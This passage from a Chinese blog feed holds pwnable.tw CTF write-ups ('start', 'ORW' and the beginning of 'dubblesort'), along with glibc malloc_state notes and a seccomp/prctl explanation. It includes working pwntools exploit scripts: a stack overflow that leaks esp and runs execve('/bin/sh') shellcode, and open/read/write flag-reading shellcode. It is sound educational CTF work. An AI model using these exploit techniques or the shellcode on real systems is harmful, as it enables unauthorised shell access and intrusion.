class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>glibc中的<code>arena</code>使用的就是此结构体。</li>
<li>该结构体包含了各种信息，例如<code>bin</code>链的头地址、<code>topchunk</code>的地址以及<code>last remainder</code>地址等等</li>
<li>成员binmap用于记录bin的相关信息，例如某个bin是否为空
<ul>
<li>当需要遍历bin时，可以转而遍历binmap，以减小直接遍历bin时的 <strong>内存页载入、搜索、切换到下一个内存页等等</strong> 所带来的时间消耗</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw 部分题解</title>
    <url>/2020/03/pwnable.tw/</url>
    <content><![CDATA[<p><a href="http://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a> 部分详细题解</p>
<h2 id="1-start">1. start</h2>
<p>点击 <a href="/2020/03/pwnable.tw/start" title="这里">这里</a> 下载题目</p>
<h3 id="易知信息">易知信息</h3>
<ul>
<li>所有保护都被禁用</li>
<li>有明显的栈溢出</li>
<li><code>sys_read</code>和<code>sys_write</code>所操作的内存空间都是<code>esp</code>指向的位置</li>
</ul>
<h3 id="分析">分析</h3>
<ul>
<li>程序没有开启<code>NX</code>保护，所以我们可以通过写入并执行<code>shellcode</code>来获得<code>shell</code></li>
<li>但在执行<code>shellcode</code>之前，我们需要先得到<code>esp</code>的具体值，从而计算出<code>shellcode</code>在栈上的具体地址
<ul>
<li>分析汇编代码和栈结构，我们可以发现，<code>old esp</code>被存到了栈的底部。</li>
<li>所以只要我们将这个地址泄露出来，那么就可以得知栈顶地址。</li>
<li>而当程序第一次<code>ret</code>后，<code>esp</code>就指向<code>old esp</code></li>
<li>所以我们可以通过<code>ret</code>至<code>sys_write</code>，将<code>old esp</code>泄露，同时还可以进行二次栈溢出，写入并跳转至<code>shellcode</code>。</li>
</ul>
</li>
</ul>
<a id="more"></a>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"># 第一次执行sys_write之前的栈空间结构</span><br><span class="line">pwndbg&gt; stack <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">esp</span>      <span class="number">0xffffd2c4</span> —&gt; <span class="number">0x2774654c</span> (<span class="string">"Let'"</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0xffffd2c8</span> —&gt; <span class="number">0x74732073</span> (<span class="string">'s st'</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│          <span class="number">0xffffd2cc</span> —&gt; <span class="number">0x20747261</span> (<span class="string">'art '</span>)</span><br><span class="line"><span class="number">03</span>:000c│          <span class="number">0xffffd2d0</span> —&gt; <span class="number">0x20656874</span> (<span class="string">'the '</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0xffffd2d4</span> —&gt; <span class="number">0x3a465443</span> (<span class="string">'CTF:'</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│          <span class="number">0xffffd2d8</span> —&gt; <span class="number">0x804809d</span> (_exit) —&gt; <span class="keyword">pop</span>    <span class="built_in">esp</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│ old <span class="built_in">esp</span>  <span class="number">0xffffd2dc</span> —&gt; <span class="number">0xffffd2e0</span> —&gt; <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:001c│          <span class="number">0xffffd2e0</span> —&gt; <span class="number">0x1</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│          <span class="number">0xffffd2e4</span> —&gt; <span class="number">0xffffd486</span> —&gt; <span class="string">'/root/Desktop/tmp/Pwn/start'</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│          <span class="number">0xffffd2e8</span> —&gt; <span class="number">0x0</span></span><br><span class="line">0a:<span class="number">0028</span>│          <span class="number">0xffffd2ec</span> —&gt; <span class="number">0xffffd4a2</span> —&gt; <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h3 id="解决方案">解决方案</h3>
<ol>
<li>构建并输入payload，通过缓冲区溢出漏洞，设置程序<code>ret</code>时跳转回<code>sys_write</code>，从而泄露<code>esp</code></li>
<li>通过泄露出的<code>esp</code>，计算出<code>shellcode</code>的地址</li>
<li>再次构建并输入payload, 设置栈上<code>old eip</code>为<code>shellcode</code>的地址，同时写入<code>shellcode</code></li>
<li>程序<code>ret</code>时跳转到<code>shellcode</code>，成功<code>get shell</code>.</li>
</ol>
<h4 id="EXP">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">20</span> * <span class="string">"a"</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">io.sendafter(<span class="string">"the CTF:"</span>, payload)</span><br><span class="line">esp = io.recv()[:<span class="number">4</span>]</span><br><span class="line">payload = <span class="number">20</span> *<span class="string">"a"</span> + p32(u32(esp) + <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>\</span><br><span class="line">                   <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>\</span><br><span class="line">                   <span class="string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>\</span><br><span class="line">                   <span class="string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="随笔">随笔</h3>
<ul>
<li>这是我见过最小的pwn题，但短小精悍，需要好好下一番功夫</li>
</ul>
<h3 id="参考">参考</h3>
<blockquote>
<p><a href="http://shell-storm.org/shellcode/files/shellcode-811.php" target="_blank" rel="noopener">Linux/x86 - execve(/bin/sh) - 28 bytes by Jean Pascal Pereira</a></p>
</blockquote>
<hr>
<h2 id="2-ORW">2. ORW</h2>
<p>Only open read write syscall are allowed to use.<br>
点击 <a href="/2020/03/pwnable.tw/orw" title="这里">这里</a> 下载题目</p>
<h3 id="易知信息-2">易知信息</h3>
<ul>
<li>可直接执行<code>shellcode</code></li>
<li>只可使用 <code>sys_open</code> <code>sys_read</code> 和 <code>sys_write</code>（题目规定）</li>
</ul>
<h3 id="解决方案-2">解决方案</h3>
<ul>
<li>直接发送构造好的<code>shellcode</code>，获得<code>flag</code></li>
</ul>
<h4 id="EXP-2">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804A060</span> + <span class="number">0x60</span></span><br><span class="line">shellcode = asm(shellcraft.open(<span class="string">"/home/orw/flag"</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>, buf, <span class="number">0x60</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, buf, <span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">"Give my your shellcode:"</span>, shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="有趣的code">有趣的code</h3>
<p>在刚看到题目时，有个问题一直在困扰着我 —— 题目要如何限制我不使用<code>sys_exec</code>呢？<br>
直到我看到了这个函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [sp+4h] [bp-84h]@1</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [sp+8h] [bp-80h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [sp+Ch] [bp-7Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+6Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现，这个函数内的核心语句为里面的两个<code>prctl</code>函数调用<br>
而<code>prctl</code>是干什么用的呢？</p>
<h4 id="prctl">prctl</h4>
<p>通过查阅<code>Linux manual page</code>的相关信息，可以得出，这个函数是对进程做一些设置</p>
<blockquote>
<p>prctl - operations on a process<br>
prctl() is called with a first argument describing what to do (with<br>
values defined in &lt;linux/prctl.h&gt;), and further arguments with a<br>
significance depending on the first one.</p>
</blockquote>
<p>函数原型为</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span>;</span><br></pre></td></tr></table></figure>
<p>通过查阅<code>/usr/include/linux/prctl.h</code>，我们可以得知题目里的两个枚举分别为<code>PR_SET_NO_NEW_PRIVS</code>和<code>PR_SET_SECCOMP</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  /usr/include/linux/prctl.h</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">* If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment">* execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment">* file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment">* capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment">* asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment">* in execve returning -EPERM.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PR_SET_NO_NEW_PRIVS 38</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set process seccomp mode */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PR_SET_SECCOMP 22</span></span><br></pre></td></tr></table></figure>
<p>而这两个枚举有什么用呢，让我们一起查阅一下<code>Linux manual page</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PR_SET_NO_NEW_PRIVS (since Linux 3.5)</span><br><span class="line">    Set the calling thread&#39;s no_new_privs attribute to the value</span><br><span class="line">    in arg2.  With no_new_privs set to 1, execve(2) promises not</span><br><span class="line">    to grant privileges to do anything that could not have been</span><br><span class="line">    done without the execve(2) call.  Once set, this the</span><br><span class="line">    no_new_privs attribute cannot be unset.  The setting of this</span><br><span class="line">    attribute is inherited by children created by fork(2) and</span><br><span class="line">    clone(2), and preserved across execve(2).</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PR_SET_SECCOMP (since Linux 2.6.23)</span><br><span class="line">    Set the secure computing (seccomp) mode for the calling</span><br><span class="line">    thread, to limit the available system calls.  </span><br><span class="line"></span><br><span class="line">    The seccomp mode is selected via arg2.</span><br><span class="line"></span><br><span class="line">    With arg2 set to SECCOMP_MODE_STRICT, the only system calls</span><br><span class="line">    that the thread is permitted to make are read(2), write(2),</span><br><span class="line">    _exit(2) (but not exit_group(2)), and sigreturn(2).  Other</span><br><span class="line">    system calls result in the delivery of a SIGKILL signal.</span><br><span class="line"></span><br><span class="line">    With arg2 set to SECCOMP_MODE_FILTER (since Linux 3.5), the</span><br><span class="line">    system calls allowed are defined by a pointer to a Berkeley</span><br><span class="line">    Packet Filter passed in arg3.  This argument is a pointer to</span><br><span class="line">    struct sock_fprog; it can be designed to filter arbitrary sys‐</span><br><span class="line">    tem calls and system call arguments.</span><br></pre></td></tr></table></figure>
<p>再看看与<code>PR_SET_SECCOMP</code>相关的枚举定义（位于<code>/usr/include/linux/seccomp.h</code>）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  /usr/include/linux/seccomp.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Valid values for seccomp.mode and prctl(PR_SET_SECCOMP, &lt;mode&gt;) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_DISABLED 0 <span class="comment">/* seccomp is not in use. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_STRICT 1 <span class="comment">/* uses hard-coded filter. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECCOMP_MODE_FILTER 2 <span class="comment">/* uses user-supplied filter. */</span></span></span><br></pre></td></tr></table></figure>
<p>通过以上信息，我们可以得出：</p>
<ul>
<li>
<p>当<code>PR_SET_NO_NEW_PRIVS</code>被设置之后，如果<code>arg2</code>是<code>1</code>，那么我们就无法通过系统中断来调用<code>sys_exec</code>，同时这项设置还会<code>继承给子进程</code></p>
</li>
<li>
<p>当<code>PR_SET_SECCOMP</code>被设置之后</p>
<ul>
<li>如果<code>arg2</code>是<code>SECCOMP_MODE_STRICT</code>,则当程序执行除<code>read</code>、<code>write</code>、<code>_exit</code>和<code>sigreturn</code>以为的指令时，将会收到<code>SIGKILL</code>信号</li>
<li>如果<code>arg2</code>是<code>SECCOMP_MODE_FILTER</code>,则程序的系统调用规则将会设置为<code>arg3</code> <code>(sock_fprog结构体指针)</code> 指向的规则。该指针所指内存上的规则是基于<code>Berkeley Packet Filter</code> <code>（BPF）</code>沙箱规则。</li>
</ul>
</li>
<li>
<p>当前程序所执行的是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;v1);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如此，便限制住程序不能执行<code>sys_exec</code>.<br>
至于关于<code>BPF</code>沙箱规则的分析，由于我水平有限，故暂时不做分析，等到以后水平提高了再战</p>
<h3 id="参考-2">参考</h3>
<ul>
<li><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">Linux Syscall Reference</a></li>
<li><a href="http://man7.org/linux/man-pages/man2/prctl.2.html" target="_blank" rel="noopener">prctl(2) - Linux manual page</a></li>
<li><a href="http://www.secwk.com/2019/09/20/6564/" target="_blank" rel="noopener">一道 CTF 题目学习 prctl 函数的沙箱过滤规则</a></li>
</ul>
<hr>
<h2 id="3-dubblesort">3. dubblesort</h2>
<p>Sort the memory!</p>
<!--more-->
<p>点击 <a href="/2020/03/pwnable.tw/dubblesort.zip" title="这里">这里</a> 下载题目</p>
<h3 id="执行流程">执行流程</h3>
<ol>
<li>提示用户输入姓名</li>
<li>将姓名输出</li>
<li>提示用户输入即将输入数字的个数n</li>
<li>提示用户输入n个数字</li>
<li>对这些数进行<code>冒泡排序</code></li>
<li>输出排序后的所有数字</li>
</ol>
<h3 id="易知信息-3">易知信息</h3>
<ul>
<li>保护全开（简直不要太惊喜）</li>
<li>存在一个无法直接使用的栈溢出</li>
</ul>
<h3 id="分析前的操作">分析前的操作</h3>
<p>题目给了一个libc出来，所以我们可以…</p>
<ul>
<li>
<p>先查看该libc的<code>相关信息</code></p>
<ul>
<li>
<p>先查看给出的libc的<code>版本</code>。通过输出信息可以得知该libc为 <code>Ubuntu GLIBC 2.23-0ubuntu5</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [20:56:20]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./libc_32.so.6</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>再查看给出的libc的<code>位数</code> 。 通过输出信息可得知为<code>32位</code>（这一步可做可不做，因为方法太多了，无论是直接查看还是间接查看）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [20:57:02]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file libc_32.so.6</span></span><br><span class="line">libc_32.so.6: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=d26149b8dc15c0c3ea8a5316583757f69b39e037, for GNU/Linux 2.6.32, stripped</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>再修改可执行文件<code>header</code>里的<code>ld path</code>和<code>libc path</code>为指定的文件（点击<a href="/2020/03/pwnable.tw/x86_ld-2.23.so.2" title="x86_ld-2.23.so.2">x86_ld-2.23.so.2</a>下载<code>ld</code>文件）<br>
<strong>使该可执行文件强制使用给定的<code>libc</code></strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置可执行文件使用的ld链接器为指定的ld （ld版本必须和libc的版本一致！！！）</span></span><br><span class="line">patchelf --set-interpreter /root/Desktop/Pwn/tmp/x86_ld-2.23.so.2 dubblesort</span><br><span class="line"><span class="meta">#</span><span class="bash"> 替换可执行文件使用的libc为指定的libc</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /root/Desktop/Pwn/libc_32.so.6 dubblesort</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后查看是否修改成功</p>
<ul>
<li>
<p>第一种方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [23:55:46]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldd dubblesort</span></span><br><span class="line">        linux-gate.so.1 (0xf7fba000)</span><br><span class="line">        /root/Desktop/Pwn/libc_32.so.6 (0xf7dfc000)</span><br><span class="line">        /root/Desktop/Pwn/tmp/x86_ld-2.23.so.2 =&gt; /lib/ld-linux.so.2 (0xf7fbb000)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>第二种方法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> root @ Kiprey <span class="keyword">in</span> ~/Desktop/Pwn [23:57:28] C:130</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> readelf -d dubblesort</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xea8 contains 27 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line">0x00000001 (NEEDED)                     Shared library: [/root/Desktop/Pwn/libc_32.so.6]</span><br><span class="line">0x0000000c (INIT)                       0x5f8</span><br><span class="line">0x0000000d (FINI)                       0xbb4</span><br><span class="line">0x00000019 (INIT_ARRAY)                 0x1e9c</span><br><span class="line">0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x0000001a (FINI_ARRAY)                 0x1ea0</span><br><span class="line">0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line">0x6ffffef5 (GNU_HASH)                   0x1ac</span><br><span class="line">0x00000005 (STRTAB)                     0x3000</span><br><span class="line">0x00000006 (SYMTAB)                     0x1e0</span><br><span class="line">0x0000000a (STRSZ)                      358 (bytes)</span><br><span class="line">0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line">0x00000015 (DEBUG)                      0x0</span><br><span class="line">0x00000003 (PLTGOT)                     0x1fa0</span><br><span class="line">0x00000002 (PLTRELSZ)                   112 (bytes)</span><br><span class="line">0x00000014 (PLTREL)                     REL</span><br><span class="line">0x00000017 (JMPREL)                     0x588</span><br><span class="line">0x00000011 (REL)                        0x538</span><br><span class="line">0x00000012 (RELSZ)                      80 (bytes)</span><br><span class="line">0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line">0x00000018 (BIND_NOW)</span><br><span class="line">0x6ffffffb (FLAGS_1)                    Flags: NOW</span><br><span class="line">0x6ffffffe (VERNEED)                    0x4d8</span><br><span class="line">0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line">0x6ffffff0 (VERSYM)                     0x4a8</span><br><span class="line">0x6ffffffa (RELCOUNT)                   4</span><br><span class="line">0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="分析-2">分析</h3>
<ul>
<li>
<p><code>main</code>函数里读取<code>name</code>用的是<code>read</code>函数，在下一行还会输出<code>name</code>。<br>
所以我们可以输入一个无<code>\0</code>结尾的字符串，从而在下一行<code>scanf</code>时，将栈上数据泄露出来</p>
</li>
<li>
<p>先看看栈上有没有什么有用的数据</p>
<ul>
<li>
<p>查看栈上信息</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">esp</span>      <span class="number">0xffffd1b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0xffffd1b4</span> —▸ <span class="number">0x56555c24</span> ◂— <span class="keyword">dec</span>    <span class="built_in">eax</span> /* <span class="string">'Hello %s,How many numbers do you what to sort :'</span> */</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│          <span class="number">0xffffd1b8</span> —▸ <span class="number">0xffffd1ec</span> ◂— <span class="number">0x74736574</span> (<span class="string">'test'</span>)</span><br><span class="line"><span class="number">03</span>:000c│          <span class="number">0xffffd1bc</span> —▸ <span class="number">0xf7eaf76b</span> ◂— <span class="keyword">add</span>    <span class="built_in">esp</span>, <span class="number">0x10</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0xffffd1c0</span> —▸ <span class="number">0xffffd1ee</span> ◂— <span class="number">0xd40a7473</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│          <span class="number">0xffffd1c4</span> —▸ <span class="number">0xffffd2ec</span> —▸ <span class="number">0xffffd4a8</span> ◂— <span class="string">'CLUTTER_IM_MODULE=fcitx'</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│          <span class="number">0xffffd1c8</span> ◂— <span class="number">0xe0</span></span><br><span class="line"><span class="number">07</span>:001c│          <span class="number">0xffffd1cc</span> —▸ <span class="number">0xf7f3c48a</span> ◂— <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span> + <span class="number">0x18</span>]</span><br><span class="line"><span class="number">08</span>:<span class="number">0020</span>│          <span class="number">0xffffd1d0</span> —▸ <span class="number">0xffffd1ef</span> —▸ <span class="number">0xffd40a74</span> ◂— <span class="number">0xffd40a74</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0024</span>│          <span class="number">0xffffd1d4</span> ◂— <span class="number">0x0</span></span><br><span class="line">0a:<span class="number">0028</span>│          <span class="number">0xffffd1d8</span> ◂— <span class="number">0xc30000</span></span><br><span class="line"><span class="number">0b</span>:002c│          <span class="number">0xffffd1dc</span> ◂— <span class="number">0x1</span></span><br><span class="line">0c:<span class="number">0030</span>│          <span class="number">0xffffd1e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0d</span>:<span class="number">0034</span>│          <span class="number">0xffffd1e4</span> —▸ <span class="number">0xffffd48b</span> ◂— <span class="string">'/root/Desktop/Pwn/dubblesort'</span></span><br><span class="line">0e:<span class="number">0038</span>│          <span class="number">0xffffd1e8</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line">0f:003c│ <span class="built_in">ecx</span> <span class="built_in">esi</span>  <span class="number">0xffffd1ec</span> ◂— <span class="number">0x74736574</span> (<span class="string">'test'</span>)</span><br><span class="line"><span class="number">10</span>:<span class="number">0040</span>│          <span class="number">0xffffd1f0</span> —▸ <span class="number">0xffffd40a</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0044</span>│          <span class="number">0xffffd1f4</span> ◂— <span class="number">0x2f</span> /* <span class="string">'/'</span> */</span><br><span class="line"><span class="number">12</span>:<span class="number">0048</span>│          <span class="number">0xffffd1f8</span> ◂— <span class="number">0x9e</span></span><br><span class="line"><span class="number">13</span>:004c│          <span class="number">0xffffd1fc</span> ◂— <span class="number">0x16</span></span><br><span class="line"><span class="number">14</span>:<span class="number">0050</span>│          <span class="number">0xffffd200</span> ◂— <span class="number">0x8000</span></span><br><span class="line"><span class="number">15</span>:<span class="number">0054</span>│          <span class="number">0xffffd204</span> —▸ <span class="number">0xf7fd0000</span> ◂— <span class="number">0x1afdb0</span></span><br><span class="line"><span class="number">16</span>:<span class="number">0058</span>│          <span class="number">0xffffd208</span> —▸ <span class="number">0xf7fce244</span> —▸ <span class="number">0xf7e38020</span> ◂— <span class="keyword">call</span>   <span class="number">0xf7f3d0d9</span></span><br><span class="line"><span class="number">17</span>:005c│          <span class="number">0xffffd20c</span> —▸ <span class="number">0x56555601</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x199f</span></span><br><span class="line"><span class="number">18</span>:<span class="number">0060</span>│          <span class="number">0xffffd210</span> —▸ <span class="number">0x565557a9</span> ◂— <span class="keyword">add</span>    <span class="built_in">ebx</span>, <span class="number">0x17f7</span></span><br><span class="line"><span class="number">19</span>:<span class="number">0064</span>│          <span class="number">0xffffd214</span> —▸ <span class="number">0x56556fa0</span> ◂— <span class="number">0x1ea8</span></span><br><span class="line">1a:<span class="number">0068</span>│          <span class="number">0xffffd218</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">1b</span>:006c│          <span class="number">0xffffd21c</span> —▸ <span class="number">0x56555b72</span> ◂— <span class="keyword">add</span>    <span class="built_in">edi</span>, <span class="number">1</span></span><br><span class="line">1c:<span class="number">0070</span>│          <span class="number">0xffffd220</span> ◂— <span 